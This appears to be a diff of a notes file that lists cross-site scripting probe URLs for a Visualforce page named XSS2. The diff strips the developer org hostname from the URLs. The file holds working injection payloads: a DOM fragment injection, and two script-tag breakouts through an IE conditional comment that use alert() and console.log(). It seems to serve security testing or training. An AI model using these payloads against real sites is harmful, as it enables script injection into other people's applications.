@@ -1,13 +1,13 @@
-Results will be in the web browser dev console (F12):
+!!! Results will be in the web browser dev console (F12): !!!
 
 
-https://rdbmlrodneybeedecom-dev-ed--c.develop.vf.force.com/apex/XSS2?#%22;%20console.log('xssdom');//
+/apex/XSS2?#%22;%20console.log('xssdom');//
 
 
 # Breaking out of IE if comment
-https://rdbmlrodneybeedecom-dev-ed--c.develop.vf.force.com/apex/XSS2?userparam=testing%27;%3C/script%3E%3C![endif]--%3E%3Cscript%3Ealert(123)%3C/script%3E
+/apex/XSS2?userparam=testing%27;%3C/script%3E%3C![endif]--%3E%3Cscript%3Ealert(123)%3C/script%3E
 
 
 # variant 2
 
-https://rdbmlrodneybeedecom-dev-ed--c.develop.vf.force.com/apex/XSS2?debugmode=haha%22/%3E%3C![endif]--%3E%3Cscript%3Ealert(%27you%20got%20xss%20variant%27);%3C/script%3E
+/apex/XSS2?debugmode=haha%22/%3E%3C![endif]--%3E%3Cscript%3Ealert(%27you%20got%20xss%20variant%27);%3C/script%3E
